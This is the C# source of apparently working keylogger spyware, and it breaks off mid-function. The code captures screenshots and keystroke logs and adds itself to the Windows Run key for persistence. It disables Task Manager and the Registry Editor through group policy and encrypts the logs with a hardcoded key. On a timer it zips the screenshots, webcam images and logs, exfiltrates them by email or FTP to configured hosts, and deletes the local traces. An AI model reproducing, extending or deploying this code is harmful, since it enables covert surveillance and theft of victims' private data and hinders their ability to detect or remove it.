using Ionic.Zip;
using Microsoft.Win32;
using MyKeylogger.Lib.HotKeys;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using keylog;
using System.DirectoryServices;
using System.Collections;

namespace tt
{
    public static class Functions
    {
        [DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]

        public static extern IntPtr GetForegroundWindow();
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int cch);
        [DllImport("user32.dll")]

        internal static extern short GetKeyState(Keys nVirtualKey);

        public static bool IsToggled(this Keys key)
        {
            return GetKeyState(key) == 0x1;
        }

        public static bool IsKeyPressed(this Keys key)
        {
            var result = GetKeyState(key);
            switch (result)
            {
                case 0: return false;
                case 1: return false;
                default: return true;
            }
        }

        public static string GetActiveWindowText()
        {
            var handle = GetForegroundWindow();
            var sb = new StringBuilder();
            GetWindowText(handle, sb, 1000);
            return sb.Length == 0 ? "UnhandleWindow" : sb.ToString();
        }

        public static void CreateFile()
        {
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger_" + DateTime.Now.ToLongDateString().ToString() + ".ini"))
                return;
            File.Create(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger_" + DateTime.Now.ToLongDateString().ToString() + ".ini");
            // File.Create(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger.ini", FileAttributes.Hidden);
        }

        // hot key
        // not complete
        public static void SetHotKey()
        {
            HotKeySet hks = new HotKeySet(new[] { Keys.T, Keys.LShiftKey, Keys.RShiftKey });
            hks.RegisterExclusiveOrKey(new[] { Keys.LShiftKey, Keys.RShiftKey });
            //if(is)
        }
        /// <summary>
        ///  capture screen
        /// </summary>
        /// <param name="imagePath"></param>
        /// <param name="quality"></param>
        /// <param name="imageCount"></param>
        /// <param name="imageExtendtion"></param>
        /// <param name="Timestamp_Username"></param>
        public static void ScreenShotSingleScreen(string imagePath, int imageCount, bool Timestamp_Username = true, Int64 quality = 50, string imageExtendtion = ".jpeg")
        {
            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
                                       Screen.PrimaryScreen.Bounds.Height,
                                       PixelFormat.Format32bppArgb);

            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);

            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X,
                                        Screen.PrimaryScreen.Bounds.Y,
                                        0,
                                        0,
                                        Screen.PrimaryScreen.Bounds.Size,
                                        CopyPixelOperation.SourceCopy);

            string directoryImage = imagePath + DateTime.Now.ToLongDateString();

            if (!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }
            string imageName = "";
            if (Timestamp_Username == true)
                imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.Hour.ToString() + '_' + DateTime.Now.Minute.ToString() + '_' + DateTime.Now.Second.ToString() + '_' + imageCount + '_' + Environment.UserName, imageExtendtion);
            else
                imageName = string.Format("{0}\\{1}{2}", directoryImage, DateTime.Now.Hour.ToString() + '_' + DateTime.Now.Minute.ToString() + '_' + DateTime.Now.Second.ToString() + '_' + imageCount, imageExtendtion);

            try
            {
                var encoder = ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
                var encParams = new EncoderParameters() { Param = new[] { new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality) } };
                bmpScreenshot.Save(imageName, encoder, encParams);
            }
            catch
            {

            }
            imageCount++;
        }

        public static void ScreenShotDoubleScreen(string imagePath, int imageCount, bool Timestamp_Username = true, Int64 quality = 50, string imageExtendtion = ".jpeg")
        {
            Rectangle desktopRec = GetDesktopBound();
            Bitmap bitmap = new Bitmap(desktopRec.Width, desktopRec.Height);
            using (Graphics graphics = Graphics.FromImage(bitmap))
            {
                graphics.CopyFromScreen(desktopRec.Location, Point.Empty, bitmap.Size);
            }

            string directoryImage = imagePath + DateTime.Now.ToLongDateString();

            if (!Directory.Exists(directoryImage))
            {
                Directory.CreateDirectory(directoryImage);
            }

            string imageName = "";
            if (Timestamp_Username == true)
                imageName = string.Format("{0}\\{1}{2}", directoryImage, imageCount + '_' + DateTime.Now.Hour.ToString() + '_' + DateTime.Now.Minute.ToString() + '_' + DateTime.Now.Second.ToString() + '_' + Environment.UserName, imageExtendtion);
            else
                imageName = string.Format("{0}\\{1}{2}", directoryImage, imageCount + '_' + DateTime.Now.Hour.ToString() + '_' + DateTime.Now.Minute.ToString() + '_' + DateTime.Now.Second.ToString(), imageExtendtion);

            try
            {
                var encoder = ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
                var encParams = new EncoderParameters() { Param = new[] { new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality) } };
                bitmap.Save(imageName, encoder, encParams);
            }
            catch
            {

            }
            imageCount++;
        }
        private static Rectangle GetDesktopBound()
        {
            Rectangle result = new Rectangle();
            foreach (Screen screen in Screen.AllScreens)
                result = Rectangle.Union(result, screen.Bounds);
            return result;
        }

        /// Alerts
        /// 
        public static bool isAlerts(List<string> alertList, string word)
        {

            for (int i = 0; i < alertList.Count; i++)
            {
                string s = alertList.ElementAt(i);

                if (word.ToLower() == s.ToLower())
                {
                    return true;
                }
            }

            return false;
        }

        /// <summary>
        /// run as start up
        /// </summary>
        public static void RunStartUp()
        {
            RegistryKey regkey = Registry.CurrentUser.CreateSubKey("Software\\ListenToUser");
            RegistryKey regstart = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
            string keyvalue = "1";
            try
            {
                regkey.SetValue("Index", keyvalue);
                regstart.SetValue("ListenToUser", Application.StartupPath + "\\" + Application.ProductName + ".exe");
                regkey.Close();
            }
            catch (System.Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
        /// <summary>
        /// disable run as start up
        /// </summary>
        public static void DontRunStartUp()
        {
            RegistryKey regkey = Registry.CurrentUser.OpenSubKey("Software\\ListenToUser", true);
            RegistryKey regstart = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

            try
            {
                regkey.DeleteValue("Index", false);
                regstart.DeleteValue("ListenToUser", false);
                regkey.Close();
                regstart.Close();
            }
            catch (System.Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

        /// Timing counter/StartTimmer
        /// sec = time need to use 
        // for Screen Shot
        static int intervalScreenShot = 1;
        public static void StartTimmerScreenShot(int min, int sec, bool timeStamp = true, int quality = 50, bool doubleScreen = false)
        {
            int imageCount = 1;
            int time = (min * 60 + sec) * 1000;
            Thread thread = new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(1);

                    if (intervalScreenShot % time == 0)
                    {
                        if (doubleScreen == false)
                            ScreenShotSingleScreen("ScreenShot\\", imageCount, timeStamp, quality);
                        else
                            ScreenShotDoubleScreen("ScreenShot\\", imageCount, timeStamp, quality);
                        //
                        Console.WriteLine("Screenshot successful!!");
                        imageCount++;
                        intervalScreenShot = 0;
                    }
                    intervalScreenShot++;
                        
                }

            });
            thread.IsBackground = true;
            thread.Start();
        }
 
        
        // Start timming counter for Email
        static private Dictionary <string,string> d_email = new Dictionary<string,string>();
        static int intervalEmail = 1;
        public static void StartTimmerEmail(int hours, int min)
        {
            Load_File("email_conf.ini", d_email);
            int time = (hours * 60 + min) * 60 * 1000;

            Thread thread = new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(1);

                    if (intervalEmail % time == 0)
                    {
                        Send_Email();
                        intervalEmail = 0;
                    }
                    intervalEmail++;
                }

            });
            thread.IsBackground = true;
            thread.Start();
        }
        //---------------------//
        public static void Send_Email(bool alert = false)
        {
            if(alert == true)
                Load_File("email_conf.ini", d_email);

            if (d_email["Username"].ToString() == null || d_email["password"].ToString() == null || d_email["SMTP"].ToString() == null || d_email["To"].ToString() == null || d_email["Port"].ToString() == null)
            {
                return;
            }

            System.Net.WebRequest req = System.Net.WebRequest.Create("https://www.google.com");
            System.Net.WebResponse resp = default(System.Net.WebResponse);
            bool bStatus;
            try
            {
                resp = req.GetResponse();
                resp.Close();
                req = null;
                bStatus = true;
            }
            catch (Exception ex)
            {
                req = null;
                bStatus = false;
                Console.WriteLine(ex.ToString());
            }

            if (bStatus == true)
            {
                MailMessage mail = new MailMessage();
                SmtpClient smtpServer = new SmtpClient(d_email["SMTP"].ToString());
                mail.From = new MailAddress(d_email["Username"].ToString());
                mail.To.Add(d_email["To"].ToString());
                mail.Subject = "Keylogger";
                mail.Body = "Nội dung được thu thập";

                int iPort;
                Int32.TryParse(d_email["Port"], out iPort);
                smtpServer.Port = iPort;

                smtpServer.Credentials = new NetworkCredential(d_email["Username"].ToString(), d_email["password"]);

                smtpServer.EnableSsl = true;

                if (Boolean.Parse(d_email["Images"]))
                {
                    if (Boolean.Parse(d_email["Protect"]))
                    {
                        string PasswordZIP = d_email["Password"].ToString();
                        using (ZipFile zip = new ZipFile())
                        {
                            if (Directory.Exists("Screenshot"))
                            {
                                zip.Password = PasswordZIP;
                                zip.AddDirectory("Screenshot\\");
                                zip.Save("screenshot.zip");
                            }
                        }
                    }
                }

                if (Boolean.Parse(d_email["Images"]))
                {
                    if (Boolean.Parse(d_email["Protect"]))
                    {
                        string PasswordZIP = d_email["Password"].ToString();
                        using (ZipFile zip = new ZipFile())
                        {
                            if (Directory.Exists("Webcam"))
                            {
                                zip.Password = PasswordZIP;
                                zip.AddDirectory("Webcam\\");
                                zip.Save("webcam.zip");
                            }
                        }
                    }
                }

                if (Boolean.Parse(d_email["Logs"]))
                {
                    if (Boolean.Parse(d_email["Protect"]))
                    {
                        string PasswordZIP = d_email["Password"].ToString();
                        using (ZipFile zip = new ZipFile())
                        {
                            if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)))
                            {
                                zip.Password = PasswordZIP;
                                zip.AddDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
                                zip.Save("logs.zip");
                            }
                        }
                    }
                }

                double dSize = 0;
                double size_screenshot = 0;
                double size_webcam = 0;
                double size_logs = 0;
                if (File.Exists("screenshot.zip"))
                {
                    size_screenshot = (new System.IO.FileInfo("screenshot.zip").Length) / 1000;
                }

                if (File.Exists("webcam.zip"))
                {
                    size_webcam = (new System.IO.FileInfo("webcam.zip").Length) / 1000;
                }

                if (File.Exists("logs"))
                {
                    size_logs = (new System.IO.FileInfo("logs.zip").Length) / 1000;
                }

                dSize = size_webcam + size_screenshot + size_logs;

                if (Boolean.Parse(d_email["Limit"]))
                {
                    if (d_email.ContainsKey("Kb"))
                    {
                        double size_compare = Double.Parse(d_email["Kb"].ToString());
                        if (dSize <= size_compare && dSize != 0)
                        {
                            mail.Attachments.Add(new System.Net.Mail.Attachment("screenshot.zip"));
                            mail.Attachments.Add(new System.Net.Mail.Attachment("webcam.zip"));
                            mail.Attachments.Add(new System.Net.Mail.Attachment("logs.zip"));
                        }
                    }
                }
                else
                {
                    if (File.Exists("screenshot.zip"))
                        mail.Attachments.Add(new System.Net.Mail.Attachment("screenshot.zip"));

                    if (File.Exists("webcam.zip"))
                        mail.Attachments.Add(new System.Net.Mail.Attachment("webcam.zip"));

                    if (File.Exists("logs.zip"))
                        mail.Attachments.Add(new System.Net.Mail.Attachment("logs.zip"));
                }

                //mail.Attachments.Add(new System.Net.Mail.Attachment("webcam.zip"));
                smtpServer.EnableSsl = true;
                smtpServer.Send(mail);
                Console.WriteLine("Da gui mail thanh cong");

                //MessageBox.Show(d_email["Clear"]);
                if (d_email.ContainsKey("Clear"))
                {
                    if (Boolean.Parse(d_email["Clear"]))
                    {
                        if (Directory.Exists("Screenshot\\"))
                        {
                            foreach (string link in Directory.GetDirectories("Screenshot\\"))
                            {
                                System.IO.DirectoryInfo di = new DirectoryInfo(link);
                                foreach (FileInfo file in di.GetFiles())
                                    file.Delete();

                                Directory.Delete(link);

                            }
                            Directory.Delete("Screenshot\\");
                        }


                        if (Directory.Exists("Webcam\\"))
                        {
                            foreach (string link in Directory.GetDirectories("Webcam\\"))
                            {
                                //MessageBox.Show(link.ToString());
                                System.IO.DirectoryInfo di = new DirectoryInfo(link);
                                foreach (FileInfo file in di.GetFiles())
                                    file.Delete();
                                Directory.Delete(link);
                            }
                            Directory.Delete("Webcam\\");
                        }

                        if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)))
                        {
                            string path = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
                            System.IO.DirectoryInfo di = new DirectoryInfo(path);
                            foreach (FileInfo file in di.GetFiles())
                            {
                                if (file.ToString().Contains(".ini"))
                                    file.Delete();
                            }
                        }

                        try
                        {
                            if (File.Exists("screenshot.zip"))
                                File.Delete("screenshot.zip");
                            if (File.Exists("webcam.zip"))
                                File.Delete("webcam.zip");
                            if (File.Exists("logs.zip"))
                                File.Delete("logs.zip");
                        }
                        catch
                        {

                        }
                    }
                }
                Console.WriteLine("Xoa file thanh cong");

                //MessageBox.Show("Thành công");
            }
        }
        // encrypt file
        public static void Encrypt(string filePath)//, bool useHashing)
        {
            byte[] keyArray;
            // open encrypt file
            string toEncrypt = File.ReadAllText(filePath);
            byte[] toEncryptArray = UTF8Encoding.UTF8.GetBytes(toEncrypt);
            // clear text  in old file
            File.Delete(filePath);
            // password
            string key = @"p@sSw0rD";

            //System.Windows.Forms.MessageBox.Show(key);
            //If hashing use get hashcode regards to your key
            //if (useHashing)
            //{
            MD5CryptoServiceProvider hashmd5 = new MD5CryptoServiceProvider();
            keyArray = hashmd5.ComputeHash(UTF8Encoding.UTF8.GetBytes(key));
            //Always release the resources and flush data
            //of the Cryptographic service provide. Best Practice

            hashmd5.Clear();
            //}
            // else
            //    keyArray = UTF8Encoding.UTF8.GetBytes(key);

            TripleDESCryptoServiceProvider tdes = new TripleDESCryptoServiceProvider();
            //set the secret key for the tripleDES algorithm
            tdes.Key = keyArray;
            //mode of operation. there are other 4 modes. We choose ECB(Electronic code Book)
            tdes.Mode = CipherMode.ECB;
            //padding mode(if any extra byte added)
            tdes.Padding = PaddingMode.PKCS7;

            ICryptoTransform cTransform = tdes.CreateEncryptor();
            //transform the specified region of bytes array to resultArray
            byte[] resultArray = cTransform.TransformFinalBlock
                    (toEncryptArray, 0, toEncryptArray.Length);
            //Release resources held by TripleDes Encryptor
            tdes.Clear();
            //Return the encrypted data into unreadable string format
            string encr = Convert.ToBase64String(resultArray, 0, resultArray.Length);

            string encrfile = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\encr_myKeylogger_" + DateTime.Now.ToLongDateString().ToString() + ".ini";
            if (!File.Exists(encrfile))
                File.Create(encrfile);

            try
            {
                File.WriteAllText(encrfile, encr);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

        // decrypt  file
        public static void Decrypt(string filePath)//, bool useHashing)
        {
            long size = new FileInfo(filePath).Length;
            if ( size > 0 )
            {
                byte[] keyArray;
                // Read all text from file
                string cipherString = File.ReadAllText(filePath);
                //get the byte code of the text
                byte[] toEncryptArray = Convert.FromBase64String(cipherString);
                // password
                string key = @"p@sSw0rD";
                // clear text  in old file
                File.Delete(filePath);
                //if (useHashing)
                //{
                //if hashing was used get the hash code with regards to your key
                MD5CryptoServiceProvider hashmd5 = new MD5CryptoServiceProvider();
                keyArray = hashmd5.ComputeHash(UTF8Encoding.UTF8.GetBytes(key));
                //release any resource held by the MD5CryptoServiceProvider

                hashmd5.Clear();
                //}
                //else
                //{
                //if hashing was not implemented get the byte code of the key
                //   keyArray = UTF8Encoding.UTF8.GetBytes(key);
                // }

                TripleDESCryptoServiceProvider tdes = new TripleDESCryptoServiceProvider();
                //set the secret key for the tripleDES algorithm
                tdes.Key = keyArray;
                //mode of operation. there are other 4 modes.
                //We choose ECB(Electronic code Book)

                tdes.Mode = CipherMode.ECB;
                //padding mode(if any extra byte added)
                tdes.Padding = PaddingMode.PKCS7;

                ICryptoTransform cTransform = tdes.CreateDecryptor();
                byte[] resultArray = cTransform.TransformFinalBlock(toEncryptArray, 0, toEncryptArray.Length);
                //Release resources held by TripleDes Encryptor
                tdes.Clear();
                //return the Clear decrypted TEXT
                string decr = UTF8Encoding.UTF8.GetString(resultArray);
                string decrfile = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\myKeylogger_" + DateTime.Now.ToLongDateString().ToString() + ".ini";
                File.WriteAllText(decrfile, decr);
            }
        }

        /// <summary>
        /// Disable or enable task manager. need to restart to confirm
        /// </summary>
        /// <param name="enable"></param> if enable = true => delete registry and restart
        public static void SetTaskManager(bool enable)
        {
            //RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(
            //    @"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            //if (enable && objRegistryKey.GetValue("DisableTaskMgr") != null)
            //    objRegistryKey.DeleteValue("DisableTaskMgr");
            //else
            //    objRegistryKey.SetValue("DisableTaskMgr", "1");
            //objRegistryKey.Close();
            if (enable == true)
                ComputerGroupPolicyObject.SetPolicySetting(@"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System!DisableTaskMgr", "0", RegistryValueKind.DWord);
            else
                ComputerGroupPolicyObject.SetPolicySetting(@"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System!DisableTaskMgr", "1", RegistryValueKind.DWord);

        }
        // edit group policy to disable Registry editor
        public static void PreventAccessRegistryEditor(bool enable)
        {
            if (enable == true)
                ComputerGroupPolicyObject.SetPolicySetting(@"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System!DisableRegistryTools", "1", RegistryValueKind.DWord);
            else
                ComputerGroupPolicyObject.SetPolicySetting(@"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System!DisableRegistryTools", "0", RegistryValueKind.DWord);
        }
        // sth 
        public static void ShutdownComputer()
        {
            var psi = new ProcessStartInfo("shutdown", "/s /f /t 0");
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }
        public static void RestartComputer()
        {
            var psi = new ProcessStartInfo("shutdown", "/r /f /t 0");
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }
        // -------------//
        public static void Load_File(string filename, Dictionary<string, string> configfile)
        {
            configfile.Clear();
            if (File.Exists(filename))
            {
                StreamReader sr = new StreamReader(filename);
                string line;

                while ((line = sr.ReadLine()) != null)
                {
                    string[] arr = line.Split(',');
                    configfile.Add(arr[0], arr[1]);
                }
                sr.Close();

            }
        }

        /// <summary>
        /// Ftp
        /// </summary>
        static private FtpWebRequest ftpRequest = null;
        static private Stream ftpStream = null;
        static private Dictionary<string, string> d_ftp = new Dictionary<string, string>();
        private static int interval_ftp = 1;
        public static void StartTimeFTP()
        {
            Load_File("ftp_conf.ini", d_ftp);
            int iHours = Int32.Parse(d_ftp["Hours"].ToString());
            int iMinutes = Int32.Parse(d_ftp["Minutes"].ToString());
            int iTime = (iHours * 3600 * 1000) + (iMinutes * 60 * 1000) - 30*1000;
            Thread thread = new Thread(() =>
            {
                while (true)
                {
                    Thread.Sleep(1);
                    if (interval_ftp % iTime == 0)
                    {
                        Upload_FTP();
                        interval_ftp = 0;
                        Console.WriteLine("Upload ftp successfull!!!!");
                    }
                    interval_ftp++;
                        

                }
            });
            thread.IsBackground = true;
            thread.Start();
        }
        public static void Upload(string localPathFile, bool test = false)
        {
            if(test == true)
                Load_File("ftp_conf.ini", d_ftp);
            try
            {
                /*Get Local File Information*/
                FileInfo objLocalFile = new FileInfo(localPathFile);

                /* Create an FTP Request */
                ftpRequest = (FtpWebRequest)FtpWebRequest.Create("ftp://" + d_ftp["Hostname"].ToString() + "/" + d_ftp["Dir"].ToString() + "/" + localPathFile);
                /* Log in to the FTP Server with the User Name and Password Provided */
                ftpRequest.Credentials = new NetworkCredential(d_ftp["Username"].ToString(), d_ftp["Password"]);
                /* When in doubt, use these options */
                ftpRequest.UseBinary = true;

                if (Boolean.Parse(d_ftp["Passive"].ToString()))
                    ftpRequest.UsePassive = true;

                ftpRequest.KeepAlive = true;
                //ftpRequest.Timeout = 1000;
                //set Time out for request upload
                ftpRequest.Timeout = 600000 * 3;
                ftpRequest.ContentLength = objLocalFile.Length;
                /* Specify the Type of FTP Request */
                ftpRequest.Method = WebRequestMethods.Ftp.UploadFile;
                /* Establish Return Communication with the FTP Server */
                ftpStream = ftpRequest.GetRequestStream();
                /* Open a File Stream to Read the File for Upload */
                //FileStream remoteFileStream = new FileStream(remoteFile, FileMode.Create);
                FileStream remoteFileStream = objLocalFile.OpenRead();

                /* Buffer for the Uploaded Data */
                int bufferSize = (int)remoteFileStream.Length;
                byte[] byteBuffer = new byte[bufferSize];
                int bytesSent = remoteFileStream.Read(byteBuffer, 0, bufferSize);
                /* Upload the File by Sending the Buffered Data Until the Transfer is Complete */
                try
                {
                    while (bytesSent != 0)
                    {
                        ftpStream.Write(byteBuffer, 0, bytesSent);
                        bytesSent = remoteFileStream.Read(byteBuffer, 0, bufferSize);
                    }

                }
                catch (Exception ex)
                {
                    //messageUploadFile = ex.Message.ToString();
                    if (test == true)
                        MessageBox.Show(ex.ToString());
                    //Console.WriteLine(ex.ToString());
                }
                /* Resource Cleanup */
                remoteFileStream.Close();
                ftpStream.Close();
                ftpRequest = null;
                if (test == true)
                    MessageBox.Show("Successful");
            }
            catch (Exception ex)
            {
                if (test == true)
                    MessageBox.Show(ex.ToString());
            }

        }

        public static void Upload_FTP()
        {
            if (d_ftp["Hostname"].ToString() == null || d_ftp["Username"].ToString() == null || d_ftp["Password"].ToString() == null || d_ftp["Dir"].ToString() == null)
            {
                return;
            }

            System.Net.WebRequest req = System.Net.WebRequest.Create("https://www.google.com");
            System.Net.WebResponse resp = default(System.Net.WebResponse);
            bool bStatus;
            try
            {
                resp = req.GetResponse();
                resp.Close();
                req = null;
                bStatus = true;
            }
            catch (Exception ex)
            {
                req = null;
                bStatus = false;
                Console.WriteLine(ex.ToString());
            }

            if (bStatus == true)
            {
                if (Boolean.Parse(d_ftp["Enable"]))
                {
                    double dSize = 0;
                    string padding = DateTime.Now.ToLongTimeString();
                    padding = padding.Replace(":", "");
                    Console.WriteLine("padding = " + padding);
                    // check size of all logs
                    long sizeOfScreenshot = 0;
                    long sizeOfWebcam = 0;
                    long sizeOfLog = 0;
                    if (Directory.Exists("Screenshot"))
                    {
                        sizeOfScreenshot = Directory.GetFiles("Screenshot\\", "*", SearchOption.AllDirectories).Sum(t => (new FileInfo(t).Length));
                    }
                    if (Directory.Exists("Webcam"))
                    {
                        sizeOfWebcam = Directory.GetFiles("Webcam\\", "*", SearchOption.AllDirectories).Sum(t => (new FileInfo(t).Length));
                    }
                    if (File.Exists("myKeylogger.ini"))
                        sizeOfLog = new FileInfo("myKeylogger.ini").Length;

                    dSize = (sizeOfScreenshot + sizeOfWebcam + sizeOfLog) / 1000;
                    // upload file
                    if (Boolean.Parse(d_ftp["Limit"]))
                    {
                        int size_compare = Int32.Parse(d_ftp["Kb"]);
                        if (sizeOfLog <= size_compare && sizeOfLog != 0)
                        {
                            if (Boolean.Parse(d_ftp["Images"]))
                            {
                                using (ZipFile zip = new ZipFile())
                                {
                                    if (Directory.Exists("Screenshot"))
                                    {
                                        zip.AddDirectory("Screenshot\\");
                                        //zip.Password = PasswordZIP;
                                        zip.Save("screenshot" + padding + ".rar");
                                    }
                                }
                                if (File.Exists("screenshot" + padding + ".rar"))
                                {
                                    Upload("screenshot" + padding + ".rar");
                                    Console.WriteLine("Upload screenshot log successfull!");
                                }

                                using (ZipFile zip = new ZipFile())
                                {
                                    if (Directory.Exists("Webcam"))
                                    {
                                        zip.AddDirectory("Webcam\\");
                                        //zip.Password = PasswordZIP;
                                        zip.Save("webcam" + padding + ".rar");
                                    }
                                }
                                if (File.Exists("webcam" + padding + ".rar"))
                                {
                                    Upload("webcam" + padding + ".rar");
                                    Console.WriteLine("Upload webcame log successfull!");
                                }
                                // clear logs after upload successful to avoid repeat logs 
                                // clear all visual log in folder
                                if (Directory.Exists("Screenshot\\"))
                                {
                                    foreach (string link in Directory.GetDirectories("Screenshot\\"))
                                    {
                                        //MessageBox.Show(link.ToString());
                                        System.IO.DirectoryInfo di = new DirectoryInfo(link);
                                        foreach (FileInfo file in di.GetFiles())
                                            file.Delete();

                                        Directory.Delete(link);

                                    }
                                    Directory.Delete("Screenshot\\");
                                }

                                if (Directory.Exists("Webcam\\"))
                                {
                                    foreach (string link in Directory.GetDirectories("Webcam\\"))
                                    {
                                        //MessageBox.Show(link.ToString());
                                        System.IO.DirectoryInfo di = new DirectoryInfo(link);
                                        foreach (FileInfo file in di.GetFiles())
                                            file.Delete();

                                        Directory.Delete(link);

                                    }
                                    Directory.Delete("Webcam\\");
                                }
                            }

                            if (Boolean.Parse(d_ftp["Logs"]))
                            {
                                using (ZipFile zip = new ZipFile())
                                {
                                    if (Directory.Exists("TextLog"))
                                    {
                                        zip.AddDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
                                        //zip.Password = PasswordZIP;
                                        zip.Save("logs" + padding + ".rar");
                                    }
                                }
                                if (File.Exists("logs" + padding + ".rar"))
                                {
                                    Upload("logs" + padding + ".rar");
                                    Console.WriteLine("Upload text log successfull!");
                                }// clear text log
                                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)))
                                {
                                    string path = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
                                    System.IO.DirectoryInfo di = new DirectoryInfo(path);
                                    foreach (FileInfo file in di.GetFiles())
                                    {
                                        if (file.ToString().Contains(".ini"))
                                            file.Delete();
                                    }

                                }
                            }
                        }
                    }
                    else
                    {
                        if (Boolean.Parse(d_ftp["Images"]))
                        {
                            using (ZipFile zip = new ZipFile())
                            {
                                if (Directory.Exists("Screenshot"))
                                {
                                    zip.AddDirectory("Screenshot\\");
                                    //zip.Password = PasswordZIP;
                                    zip.Save("screenshot" + padding + ".rar");
                                }
                            }
                            if (File.Exists("screenshot" + padding + ".rar"))
                            {
                                Upload("screenshot" + padding + ".rar");
                                Console.WriteLine("Upload screenshot log successfull!");
                            }
                            using (ZipFile zip = new ZipFile())
                            {
                                if (Directory.Exists("Webcam"))
                                {
                                    zip.AddDirectory("Webcam\\");
                                    //zip.Password = PasswordZIP;
                                    zip.Save("webcam" + padding + ".rar");
                                }
                            }
                            if (File.Exists("webcam" + padding + ".rar"))
                            {
                                Upload("webcam" + padding + ".rar");
                                Console.WriteLine("Upload webcam log successfull!");
                            }
                            // clear logs after upload successful to avoid repeat logs 
                            // clear all visual log in folder
                            if (Directory.Exists("Screenshot\\"))
                            {
                                foreach (string link in Directory.GetDirectories("Screenshot\\"))
                                {
                                    //MessageBox.Show(link.ToString());
                                    System.IO.DirectoryInfo di = new DirectoryInfo(link);
                                    foreach (FileInfo file in di.GetFiles())
                                        file.Delete();

                                    Directory.Delete(link);

                                }
                                Directory.Delete("Screenshot\\");
                            }

                            if (Directory.Exists("Webcam\\"))
                            {
                                foreach (string link in Directory.GetDirectories("Webcam\\"))
                                {
                                    //MessageBox.Show(link.ToString());
                                    System.IO.DirectoryInfo di = new DirectoryInfo(link);
                                    foreach (FileInfo file in di.GetFiles())
                                        file.Delete();

                                    Directory.Delete(link);

                                }
                                Directory.Delete("Webcam\\");
                            }
                        }

                        if (Boolean.Parse(d_ftp["Logs"]))
                        {
                            using (ZipFile zip = new ZipFile())
                            {
                                if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)))
                                {
                                    zip.AddDirectory(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos));
                                    //zip.Password = PasswordZIP;
                                    zip.Save("logs" + padding + ".rar");
                                }
                            }
                            if (File.Exists("logs" + padding + ".rar"))
                            {
                                Upload("logs" + padding + ".rar");
                                Console.WriteLine("Upload text log successfull!");
                            }
                            // clear text log
                            if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)))
                            {
                                string path = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
                                System.IO.DirectoryInfo di = new DirectoryInfo(path);
                                foreach (FileInfo file in di.GetFiles())
                                {
                                    if (file.ToString().Contains(".ini"))
                                        file.Delete();
                                }

                            }
                        }
                    }

                    // clear zip file log if check clear log after upload successfull
                    if (Boolean.Parse(d_ftp["Clear"]))
                    {
                        try
                        {
                            if (File.Exists("screenshot" + padding + ".zip"))
                                File.Delete("screenshot" + padding + ".zip");

                            if (File.Exists("webcam" + padding + ".zip"))
                                File.Delete("webcam" + padding + ".zip");

                            if (File.Exists("logs" + padding + ".zip"))
                                File.Delete("logs" + padding + ".zip");
                        }
                        catch
                        {

                        }
                    }
                }
            }
        }
        /// done ftp
        ///
        /// target
        ///
        public static bool IsTarget(string winTitle,List<string> targetList)
        {
            foreach (var s in targetList)
            {
                if (winTitle.ToLower().Contains(s) == true)
                    return true;
            }
            return false;
        }
        // ---------------------//
        /// <summary>
        /// User
        /// </summary>
        private static Dictionary<string, string> d_users = new Dictionary<string, string>();
        public static void FindUsers()
        {

            if (!File.Exists("username.ini"))
            {
                Dictionary<string, string> d = new Dictionary<string, string>();
                DirectoryEntry localMachine = new DirectoryEntry("WinNT://" + Environment.MachineName);
                DirectoryEntry admGroup = localMachine.Children.Find("administrators", "group");
                object members = admGroup.Invoke("members", null);
                foreach (object groupMember in (IEnumerable)members)
                {
